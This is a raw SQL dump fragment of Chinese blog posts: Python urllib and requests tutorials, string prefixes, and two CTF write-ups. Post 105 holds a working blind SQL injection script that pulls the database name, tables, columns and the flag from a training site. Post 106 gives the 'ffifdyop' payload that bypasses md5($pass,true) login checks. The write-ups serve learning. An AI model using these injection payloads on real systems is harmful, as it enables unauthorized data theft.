class="python">req&nbsp;=&nbsp;urllib.request.Request(&#39;http://www.python.org/fish.html&#39;)try:\r\n&nbsp;&nbsp;&nbsp;&nbsp;urllib.request.urlopen(req)except&nbsp;urllib.error.HTTPError&nbsp;as&nbsp;e:&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;(e.code)&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;(e.info())&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;(e.geturl())&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;(e.read())</pre><p>上面程序的效果如下，<img src="/upload/image/20190417/1555481534572072.png" alt="httperror_result"/></p><p>简单起见，上图中后面的页面内容没有全部截图。</p><h3>包装一下</h3><p>如果你希望程序对<strong>HTTPError</strong>和<strong>URLError</strong>有所准备，有两种基本方法可以使用，我更喜欢第二个。</p><h4>第一种</h4><pre class="python">from&nbsp;urllib.request&nbsp;import&nbsp;Request,&nbsp;urlopenfrom&nbsp;urllib.error&nbsp;import&nbsp;URLError,&nbsp;HTTPError\r\nreq&nbsp;=&nbsp;Request(someurl)try:\r\n&nbsp;&nbsp;&nbsp;&nbsp;response&nbsp;=&nbsp;urlopen(req)except&nbsp;HTTPError&nbsp;as&nbsp;e:\r\n&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;The&nbsp;server&nbsp;couldn\\&#39;t&nbsp;fulfill&nbsp;the&nbsp;request.&#39;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;Error&nbsp;code:&nbsp;&#39;,&nbsp;e.code)except&nbsp;URLError&nbsp;as&nbsp;e:\r\n&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;We&nbsp;failed&nbsp;to&nbsp;reach&nbsp;a&nbsp;server.&#39;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;Reason:&nbsp;&#39;,&nbsp;e.reason)else:&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;everything&nbsp;is&nbsp;fine</pre><blockquote><p><strong>注意</strong>：<code>except HTTPError</code>必须放在第一个，否则<code>except URLError</code>也将捕获一个HTTPError。</p></blockquote><h4>第二种</h4><pre class="python">from&nbsp;urllib.request&nbsp;import&nbsp;Request,&nbsp;urlopenfrom&nbsp;urllib.error&nbsp;import&nbsp;URLError\r\nreq&nbsp;=&nbsp;Request(someurl)try:\r\n&nbsp;&nbsp;&nbsp;&nbsp;response&nbsp;=&nbsp;urlopen(req)except&nbsp;URLError&nbsp;as&nbsp;e:&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;hasattr(e,&nbsp;&#39;reason&#39;):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;We&nbsp;failed&nbsp;to&nbsp;reach&nbsp;a&nbsp;server.&#39;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;Reason:&nbsp;&#39;,&nbsp;e.reason)&nbsp;&nbsp;&nbsp;&nbsp;elif&nbsp;hasattr(e,&nbsp;&#39;code&#39;):\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;The&nbsp;server&nbsp;couldn\\&#39;t&nbsp;fulfill&nbsp;the&nbsp;request.&#39;)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;Error&nbsp;code:&nbsp;&#39;,&nbsp;e.code)else:&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;everything&nbsp;is&nbsp;fine</pre><h2>info和geturl</h2><p>由<code>urlopen</code>(或<em>HTTPError</em>实例)返回的响应有两个实用的方法<code>info()</code>和<code>geturl()</code>，是在模块<em>urllib.response</em>中定义的。</p><p><strong>geturl</strong>—这个方法返回的是所获取页面的真正URL路径。这个是有用的，因为<code>urlopen</code>(或者使用的opener对象)可能经过了重定向。因此所得页面的URL可能不是请求的URL。</p><p><strong>info</strong>—这个方法返回一个类似字典的对象，描述所得到的页面，尤其是服务器发回的头信息。它实际上是一个<em>http.client.HTTPMessage</em>实例。</p><p>典型的头信息包括‘Content-length’、‘Content-type’等等。你可以查看关于HTTP 头信息的<a href="https://www.cs.tut.fi/~jkorpela/http.html">快速指南</a>，这里有关于HTTP头信息的含义和使用的简短说明。</p><h2>Openers和Handlers</h2><p>当你访问URL时，你使用的就是一个opener(这是<em>urllib.reuest.OpenerDirector</em>的一个实例)。一般来说我们使用的是默认的opener—通过<code>urlopen</code>—但是你可以创建自定义的opener。<strong>opener会使用handler</strong>。所有的“重活”都是由handler完成的。每一个handler知道如何去处理某种类型的URL(http，ftp等等)，或者是如何处理访问URL的某一方面，如HTTP重定向或HTTP cookies。</p><p>如果你想要用特定的handler来访问URL，你可以创建一个opener。比如，得到一个处理cookies的opener或者是一个不处理重定向的opener。</p><p>要创建一个opener，可以实例化一个<em>OpenerDirector</em>，然后重复地调用<code>.add_handler(some_handler_instance)</code>。</p><p>或者，你可以使用<code>build_opener</code>方法，这是一个很方便的函数，可以通过一次函数调用创建opener对象。<code>build_opener</code>默认添加了一些handler，但是提供了一个简单的方法添加或者覆写默认的handler。</p><p>你可能需要其它类型的handler，比如可以处理代理，认证，以及其它常见但是特殊的情形。</p><p><code>install_opener</code>可以用来把一个opener对象设定为(全局)默认opener。这意味着调用<code>urlopen</code>的时候会使用你安装的opener。</p><p>opener对象有一个<code>open</code>方法，可以直接调用来获取URL资源，方式与<code>urlopen</code>相同：除非为了方便，否则不需要调用<code>install_opener</code>。</p><h2>基本认证</h2><p>为了说明创建和安装一个handler，我们使用<em>HTTPBasicAuthHandler</em>为例。关于这个话题的更多细节—包括关于基本认证如何工作的说明—请参看<a href="http://www.voidspace.org.uk/python/articles/authentication.shtml">基本认证教程</a>。</p><p>当需要认证(或授权)时，服务器会发送一个头信息(还有一个401错误码)请求认证。它指定了认证模式和一个“realm(领域)”。这个头信息的形式看起来是：<code>WWW-Authenticate:SCHEME realm=&quot;REALM&quot;</code>。</p><p>例如，<code>WWW-Authenticate: Basic realm=&quot;cPanel Users&quot;</code>。</p><p>如何客户端应该重新发起请求，并把对应realm的用户名与密码加入请求的头信息中。这就是“基础认证”。为了简化这个过程，我们创建一个<em>HTTPBasicAuthHandler</em>实例，再有一个opener来使用这个handler。</p><p><em>HTTPBasicAuthHandler</em>使用一个叫做密码管理器的对象处理url和用户名密码域的映射。如果你知道领域是什么(根据服务器发送的认证头信息得知)，那么你可以使用<code>HTTPPasswordMgr</code>。人们往往不在乎领域是什么。在那种情况下，最方便的就是使用<code>HTTPPasswordMgrWithDefaultRealm</code>。它允许你为一个url指定一个默认的用户名和密码。如果你没有为某个领域提供可选的组合，anemia就会使用这个。我们通过把<code>None</code>作为<code>add_password</code>方法的realm参数来表示它。</p><p>顶层url就是需要认证的第一个url，比你传递给<code>add_password()</code>方法的url更“深层”的url也将匹配。</p><pre class="python">#&nbsp;create&nbsp;a&nbsp;password&nbsp;managerpassword_mgr&nbsp;=&nbsp;urllib.request.HTTPPasswordMgrWithDefaultRealm()#&nbsp;Add&nbsp;the&nbsp;username&nbsp;and&nbsp;password.#&nbsp;If&nbsp;we&nbsp;knew&nbsp;the&nbsp;realm,&nbsp;we&nbsp;could&nbsp;use&nbsp;it&nbsp;instead&nbsp;of&nbsp;None.top_level_url&nbsp;=&nbsp;&quot;http://example.com/foo/&quot;password_mgr.add_password(None,&nbsp;top_level_url,&nbsp;username,&nbsp;password)\r\n\r\nhandler&nbsp;=&nbsp;urllib.request.HTTPBasicAuthHandler(password_mgr)#&nbsp;create&nbsp;&quot;opener&quot;&nbsp;(OpenerDirector&nbsp;instance)opener&nbsp;=&nbsp;urllib.request.build_opener(handler)#&nbsp;use&nbsp;the&nbsp;opener&nbsp;to&nbsp;fetch&nbsp;a&nbsp;URLopener.open(a_url)#&nbsp;Install&nbsp;the&nbsp;opener.#&nbsp;Now&nbsp;all&nbsp;calls&nbsp;to&nbsp;urllib.request.urlopen&nbsp;use&nbsp;our&nbsp;opener.urllib.request.install_opener(opener)</pre><blockquote><p><strong>注意</strong>：在上面的例子中,我们&nbsp;<code>build_opener</code>时只使用了我们的<code>HTTPBasicAuthHandler</code>。默认情况下，opener包含处理常见情形的handler—&nbsp;<code>ProxyHandler</code>&nbsp;(&nbsp;如果设置了代理，比如<code>http_proxy</code>变量&nbsp;),&nbsp;<code>UnknownHandler</code>,&nbsp;<code>HTTPHandler</code>,<code>HTTPDefaultErrorHandler</code>,&nbsp;<code>HTTPRedirectHandler</code>,&nbsp;<code>FTPHandler</code>,&nbsp;<code>FileHandler</code>,&nbsp;<code>DataHandler</code>,&nbsp;<code>HTTPErrorProcessor</code>.</p></blockquote><p>事实上，顶层url要么是一个完整的url(包括“http:”模式和主机名以及可选的端口号)，例如“<a href="http://example.com/" class="uri">http://example.com/</a>”&nbsp;，或者是一个“授权机构”(即主机名，可以再加一个端口号)如“example.com” 或“example.com:8080”&nbsp;。如果使用“授权机构”的话，一定不能包含“<strong>userinfo</strong>”元素—比如“joe:password@example.com”就是不正确的。</p><h2>代理</h2><p><strong>urllib</strong>会自动地检测并使用你的代理设置。这是通过<code>ProxyHandler</code>完成的，它是在检测到一个代理设置时的正常处理程序链的一部分。通常这是个好事，但是有些时候它可能没有用。还有一个方法就是设置我们自己的<em>ProxyHandler</em>，不定义代理。做法与设置一个Basic Authentication的步骤相同：</p><pre class="python">&gt;&gt;&gt;&nbsp;proxy_support&nbsp;=&nbsp;urllib.request.ProxyHandler({})&gt;&gt;&gt;&nbsp;opener&nbsp;=&nbsp;urllib.request.build_opener(proxy_support)&gt;&gt;&gt;&nbsp;urllib.request.install_opener(opener)</pre><blockquote><p><strong>Note</strong>：现在urllib.request不支持通过代理访问一个https网址。不过，可以通过这篇<a href="https://code.activestate.com/recipes/456195/">教程</a>实现。</p><p>如果设置一个变量<code>REQUEST_METHOD</code>,那么HTTP_PROXY就会被忽略，具体可以查看<code>getproxies()</code>的<a href="https://docs.python.org/3.5/library/urllib.request.html#urllib.request.getproxies">文档</a></p></blockquote><h2>套接字层</h2><p>Python对于获取网络数据的支持是有层次的。urllib使用的是<em>http.client</em>库，而他又转而使用socket库。</p><p>在Python \r\n2.3中你可以设定套接字的超时等待时长。这在必须获取网页的应用中是很有用的。默认情况下，套接字模块没有超时设置，并且可能会一直等待。目前，套接字超时不在http.client或者urllib.request层可见了。但是，你可以为所有的套接字设定一个全局的等待时长：</p><pre class="python">import&nbsp;socketimport&nbsp;urllib.request#&nbsp;timeout&nbsp;in&nbsp;secondstimeout&nbsp;=&nbsp;10socket.setdefaulttimeout(timeout)#&nbsp;this&nbsp;call&nbsp;to&nbsp;urllib.request.urlopen&nbsp;now&nbsp;uses&nbsp;the&nbsp;default&nbsp;timeout#&nbsp;we&nbsp;have&nbsp;set&nbsp;in&nbsp;the&nbsp;socket&nbsp;modulereq&nbsp;=&nbsp;urllib.request.Request(&#39;http://www.voidspace.org.uk&#39;)\r\nresponse&nbsp;=&nbsp;urllib.request.urlopen(req)</pre><p><br/></p>', 'python', 0, 5, '2019-04-17', 56, -3, 0, '/upload/image/20190417/95daceb3ead87ddd0381871801dacb6b.jpg'),
	(104, 'python3的字符串前缀', '**', '<h2>u/U:表示unicode字符串</h2><p>不是仅仅是针对中文, 可以针对任何的字符串，代表是对字符串进行unicode编码。<br/>一般英文字符在使用各种编码下, 基本都可以正常解析, 所以一般不带u；但是中文, 必须表明所需编码, 否则一旦编码转换就会出现乱码。 建议所有编码方式采用utf8。<strong>在python3中，字符串默认创建即以Unicode编码存储，可以存储中文。</strong></p><p><strong>例子一：</strong><br/>u&quot;我是含有中文字符组成的字符串。&quot;</p><p><strong>作用：</strong><br/><em>后面字符串以 Unicode 格式 进行编码，一般用在中文字符串前面，防止因为源码储存格式问题，导致再次使用时出现乱码。</em></p><p><strong>例子二：</strong><br/>string = &#39;a&#39; 等效于 string = u&#39;a&#39;</p><p>Unicode中通常每个字符由2个字节表示。<br/>u&#39;a&#39; 即 u&#39;\\u0061&#39; 实际内存中为 [0000 0000] [0110 0001]</p><hr/><h2>r/R:表示非转义的原始字符串。</h2><p>与普通字符相比，其他相对特殊的字符，其中可能包含转义字符，即那些<strong><span style="font-size:+1px;color:red">反斜杠加上对应字母</span></strong>，表示对应的特殊含义的，比如最常见的”\\n”表示换行，”\\t”表示Tab等。而如果是以r开头，那么说明后面的字符，都是普通的字符了，即如果是“\\n”那么表示一个反斜杠字符，一个字母n，而不是表示换行了。<br/>以r开头的字符，常用于正则表达式，对应着re模块。<br/>例：r&quot;\\n\\n\\n\\n”　　# 表示一个普通生字符串 \\n\\n\\n\\n，而不表示换行了。</p><p><strong>作用：</strong><br/>去掉反斜杠的转移机制。（特殊字符：即那些，反斜杠加上对应字母，表示对应的特殊含义的，比如最常见的”\\n”表示换行，”\\t”表示Tab等。 ）</p><p><strong>应用：</strong><br/>常用于正则表达式，对应着re模块。</p><hr/><h2>b:表示bytes类型字符串</h2><p>python3.x里，默认的str是(py2.x里的)unicode，bytes是(py2.x)的str，b”“前缀代表的就是bytes。<br/>python2.x里，b前缀没什么具体意义， 只是为了兼容python3.x的这种写法。</p><p><strong>例子一: </strong></p><pre>response&nbsp;=&nbsp;b&#39;&lt;h1&gt;Hello&nbsp;World!&lt;/h1&gt;&#39;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;b&#39;&nbsp;&#39;&nbsp;表示这是一个&nbsp;bytes&nbsp;对象</pre><p><strong>作用：</strong><br/>b&quot; &quot;前缀表示：后面字符串是bytes 类型。</p><p><strong>用处：</strong><br/>网络编程中，服务器和浏览器只认bytes 类型数据。如：send 函数的参数和 recv 函数的返回值都是 bytes 类型。</p><p><strong>例子二：</strong><br/>字符串存储为Ascll码，无法存储中文。</p><pre>result&nbsp;=&nbsp;b&#39;你好20190101&#39;</pre><p>编译会报如下错误：<br/>SyntaxError: bytes can only contain ASCII literal characters.</p><p>每个字符由1个字节表示(8位)<br/>b&#39;a&#39;即b&#39;\\x61&#39; 实际内存中位 [0110 0001]</p><p><strong>附：</strong><br/>在 Python3 中，bytes 和 str 的互相转换方式是<br/>str.encode(&#39;utf-8&#39;)<br/>bytes.decode(&#39;utf-8&#39;)</p><p><br/></p>', 'python', 0, 0, '2019-04-17', 56, -3, 0, '/upload/image/20190417/a914e4ed97a55052cee17a25e8e5b93f.jpg'),
	(105, '简单的sql注入3', '**', '<p>这一关就是过滤了报错注入的几个必备关键函数，过滤注释符号等等，fuzz一下就晓得了</p><p>自己写了一个python3的脚本，参开代码如下：</p><p>from urllib import request<br/>import signal<br/>import sys<br/>#去掉&#39;&#39;&#39;可运行注释部分代码<br/>&#39;&#39;&#39;<br/>#处理ctrl+C<br/>def exit(signum,frame):<br/>&nbsp;&nbsp; &nbsp;print(&#39;\\nThe script is canceled!...\\n&#39;)<br/>&nbsp;&nbsp; &nbsp;sys.exit(0)<br/>signal.signal(signal.SIGINT,exit)<br/><br/><br/>print(&#39;Start injection.......&#39;)<br/>database=&#39;&#39;<br/>tables=&#39;&#39;<br/>columns=&#39;&#39;<br/>flag=&#39;&#39;<br/>#爆当前数据库名<br/>for i in range(1,10):<br/>&nbsp;&nbsp; &nbsp;for re in range(33,126):&nbsp;&nbsp; &nbsp;<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;#进度条<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;sys.stdout.write(&#39;#&#39;+&#39;&gt;&gt;&#39;+&quot;\\b\\b&quot;)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;sys.stdout.flush()<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;#注意url编码，这里我放的是编码好的<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url=&quot;http://ctf5.shiyanbar.com/web/index_3.php?id=-1%27+or+ascii(substr((select+database())%2c{0}%2c1))%3d{1}+or+%271%27%3d%272&quot;.format(i,re)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;req=request.Request(url)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;#print(&#39;Payload:&#39;,url)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;with request.urlopen(req,data=None,timeout=60) as response:&nbsp;&nbsp; &nbsp;<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if response.read().decode(&#39;utf-8&#39;).find(str(&#39;Hello&#39;))&gt;0:<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;database+=chr(re)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;break<br/>print(&#39;\\nDatabase is:&#39;,database)<br/>print(&#39;\\n数据库名爆破完毕，开始爆表名...&#39;)&nbsp;&nbsp; &nbsp;<br/>#继续爆表名(数据库中的表名可能不止9个字符，要爆破全部的表名需要把range(1,10)范围改大点)<br/>for i in range(1,10):<br/>&nbsp;&nbsp; &nbsp;for re in range(33,126):&nbsp;&nbsp; &nbsp;<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;#进度条<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;sys.stdout.write(&#39;#&#39;+&#39;&gt;&gt;&#39;+&quot;\\b\\b&quot;)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;sys.stdout.flush()<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;#注意url编码，这里我放的是编码好的<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url=&quot;http://ctf5.shiyanbar.com/web/index_3.php?id=-1%27+or+ascii(substr((select+group_concat(table_name)+from+information_schema.tables+where+table_schema%3d%27{0}%27)%2c{1}%2c1))%3d{2}+or+%271%27%3d%272&quot;.format(database,i,re)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;req=request.Request(url)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;#print(&#39;Payload:&#39;,url)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;with request.urlopen(req,data=None,timeout=60) as response:&nbsp;&nbsp; &nbsp;<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if response.read().decode(&#39;utf-8&#39;).find(str(&#39;Hello&#39;))&gt;0:<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;tables+=chr(re)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;break&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;<br/>print(&#39;\\nTables is(This is not complement):&#39;,tables)<br/>print(&#39;\\n表名爆破完毕，开始爆列名...&#39;)&nbsp;&nbsp; &nbsp;<br/>table=tables.split(&#39;,&#39;)[0]<br/>for i in range(1,10):<br/>&nbsp;&nbsp; &nbsp;for re in range(33,126):&nbsp;&nbsp; &nbsp;<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;#进度条<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;sys.stdout.write(&#39;#&#39;+&#39;&gt;&gt;&#39;+&quot;\\b\\b&quot;)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;sys.stdout.flush()<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;#注意url编码，这里我放的是编码好的<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url=&quot;http://ctf5.shiyanbar.com/web/index_3.php?id=-1%27+or+ascii(substr((select+group_concat(column_name)+from+information_schema.columns+where+table_name%3d%27{0}%27)%2c{1}%2c1))%3d{2}+or+%271%27%3d%272&quot;.format(table,i,re)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;req=request.Request(url)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;#print(&#39;Payload:&#39;,url)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;with request.urlopen(req,data=None,timeout=60) as response:&nbsp;&nbsp; &nbsp;<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if response.read().decode(&#39;utf-8&#39;).find(str(&#39;Hello&#39;))&gt;0:<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;columns+=chr(re)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;break&nbsp;&nbsp; &nbsp;<br/>print(&#39;\\Flag\\&#39;s columns is:&#39;,columns)<br/>&#39;&#39;&#39;<br/>#好吧，前面都是我为了熟悉python而写的废话，现在才是爆flag<br/>flag=&#39;&#39;<br/>for i in range(1,30):<br/>&nbsp;&nbsp; &nbsp;for re in range(33,126):&nbsp;&nbsp; &nbsp;<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;#进度条<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;sys.stdout.write(&#39;#&#39;+&#39;&gt;&gt;&#39;+&quot;\\b\\b&quot;)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;sys.stdout.flush()<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;#注意url编码，这里我放的是编码好的<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url=&quot;http://ctf5.shiyanbar.com/web/index_3.php?id=-1%27+or+ascii(substr((select+flag+from+flag+limit+0%2c1)%2c{0}%2c1))%3d{1}+or+%271%27%3d%272&quot;.format(i,re)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;req=request.Request(url)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;#print(&#39;Payload:&#39;,url)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;with request.urlopen(req,data=None,timeout=60) as response:&nbsp;&nbsp; &nbsp;<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if response.read().decode(&#39;utf-8&#39;).find(str(&#39;Hello&#39;))&gt;0:<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;flag+=chr(re)<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;break&nbsp;&nbsp; &nbsp;<br/>print(&#39;\\nFlag is:&#39;,flag)<br/><br/>tmp=input(&#39;Press any done...&#39;)</p>', 'sql', 0, 4, '2019-04-17', 63, -2, 0, '/upload/image/20190417/f4f33a33f847f3348cab3fdad2bd903a.jpg'),
	(106, 'md5($pass,true)', '**', '<p>&nbsp;&nbsp;&nbsp;&nbsp;先看代码：</p><p>&lt;!-- $password=$_POST[&#39;password&#39;];<br/>&nbsp;&nbsp; &nbsp;$sql = &quot;SELECT * FROM admin WHERE username = &#39;admin&#39; and password = &#39;&quot;.md5($password,true).&quot;&#39;&quot;;<br/>&nbsp;&nbsp; &nbsp;$result=mysqli_query($link,$sql);<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if(mysqli_num_rows($result)&gt;0){<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;echo &#39;flag is :&#39;.$flag;<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;else{<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;echo &#39;密码错误!&#39;;<br/>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;} --&gt;</p><p>&nbsp;&nbsp;&nbsp;&nbsp;明显存在注入，但是注入点局限于md5，现在唯一想到的就是如何构造一个password，让md5($password,true)后返回的字符串为&#39; or &#39;4xx这种格式，网上很多wp就直接告诉我们payload就是url里的ffifdyop，这个字符串经过md5($password,true)确实能返回类似&#39; or &#39;4xx的结果，但是平常我们看到的md5()函数加密后的字符不是一个32位的字符串嘛，于是需要了解md5($password,true)中的参数true是干嘛的：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;</p><table><tbody><tr class="firstRow"><td>参数</td>\r\n			<td>描述</td>\r\n		</tr><tr><td>string</td>\r\n			<td>必需。要计算的字符串。</td>\r\n		</tr><tr><td>raw</td>\r\n			<td>\r\n			<p>可选。</p>\r\n\r\n			<ul class=" list-paddingleft-2"><li><p>默认不写为FALSE。32位16进制的字符串</p></li><li><p>TRUE。16位原始二进制格式的字符串</p></li></ul></td></tr></tbody></table><p>其实就是：不为true时，32位的16进制的字符串，两个一组就是选项为true时返回的字符串，比如：</p><p><code class="hljs go"><ul class=" list-paddingleft-2"><li><p>content: ffifdyop</p></li><li><p>hex: <span class="hljs-number">276f</span>722736c95d99e921722cf9ed621c</p></li><li><p>raw: <span class="hljs-string">&#39;or&#39;</span><span class="hljs-number">6</span>\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c</p></li><li><p><span class="hljs-keyword">string</span>: <span class="hljs-string">&#39;or&#39;</span><span class="hljs-number">6</span>]!r,b</p></li></ul></code></p><p>16进制的27，对应ascii码里的符号&#39;，所以raw的第一个字符显示&#39;<br/></p>', 'md5', 0, 0, '2019-04-19', 62, -2, 0, '/upload/image/20190419/6aa8057f86542c92324adf4811afa00f.jpg'),
	(107, 'python3的requests模块', '**', '<p>让我们从一些简单的示例开始吧。</p><h2>发送请求</h2><p>使用 Requests 发送网络请求非常简单。</p><p>一开始要导入 Requests 模块：</p><pre>&gt;&gt;&gt;&nbsp;import&nbsp;requests</pre><p>然后，尝试获取某个网页。本例子中，我们来获取 Github 的公共时间线：</p><pre>&gt;&gt;&gt;&nbsp;r&nbsp;=&nbsp;requests.get(&#39;https://api.github.com/events&#39;)</pre><p>现在，我们有一个名为 <code class="docutils literal"><span class="pre">r</span></code> 的 <a class="reference internal" href="http://docs.python-requests.org/zh_CN/latest/api.html#requests.Response" title="requests.Response"><code class="xref py py-class docutils literal"><span class="pre">Response</span></code></a>对象。我们可以从这个对象中获取所有我们想要的信息。</p><p>Requests 简便的 API 意味着所有 HTTP 请求类型都是显而易见的。例如，你可以这样发送一个\r\nHTTP POST 请求：</p><pre>&gt;&gt;&gt;&nbsp;r&nbsp;=&nbsp;requests.post(&#39;http://httpbin.org/post&#39;,&nbsp;data&nbsp;=&nbsp;{&#39;key&#39;:&#39;value&#39;})</pre><p>漂亮，对吧？那么其他 HTTP 请求类型：PUT，DELETE，HEAD 以及 OPTIONS 又是如何的呢？都是一样的简单：</p><pre>&gt;&gt;&gt;&nbsp;r&nbsp;=&nbsp;requests.put(&#39;http://httpbin.org/put&#39;,&nbsp;data&nbsp;=&nbsp;{&#39;key&#39;:&#39;value&#39;})&gt;&gt;&gt;&nbsp;r&nbsp;=&nbsp;requests.delete(&#39;http://httpbin.org/delete&#39;)&gt;&gt;&gt;&nbsp;r&nbsp;=&nbsp;requests.head(&#39;http://httpbin.org/get&#39;)&gt;&gt;&gt;&nbsp;r&nbsp;=&nbsp;requests.options(&#39;http://httpbin.org/get&#39;)</pre><p>都很不错吧，但这也仅是 Requests 的冰山一角呢。</p><h2>传递 URL 参数</h2><p>你也许经常想为 URL 的查询字符串(query string)传递某种数据。如果你是手工构建 URL，那么数据会以键/值对的形式置于 URL 中，跟在一个问号的后面。例如， <code class="docutils literal"><span class="pre">httpbin.org/get?key=val</span></code>。\r\nRequests 允许你使用 <code class="docutils literal"><span class="pre">params</span></code> 关键字参数，以一个字符串字典来提供这些参数。举例来说，如果你想传递<code class="docutils literal"><span class="pre">key1=value1</span></code> 和 <code class="docutils literal"><span class="pre">key2=value2</span></code> 到 <code class="docutils literal"><span class="pre">httpbin.org/get</span></code> ，那么你可以使用如下代码：</p><pre>&gt;&gt;&gt;&nbsp;payload&nbsp;=&nbsp;{&#39;key1&#39;:&nbsp;&#39;value1&#39;,&nbsp;&#39;key2&#39;:&nbsp;&#39;value2&#39;}&gt;&gt;&gt;&nbsp;r&nbsp;=&nbsp;requests.get(&quot;http://httpbin.org/get&quot;,&nbsp;params=payload)</pre><p>通过打印输出该 URL，你能看到 URL 已被正确编码：</p><pre>&gt;&gt;&gt;&nbsp;print(r.url)http://httpbin.org/get?key2=value2&amp;key1=value1</pre><p>注意字典里值为 <code class="docutils literal"><span class="pre">None</span></code> 的键都不会被添加到 URL 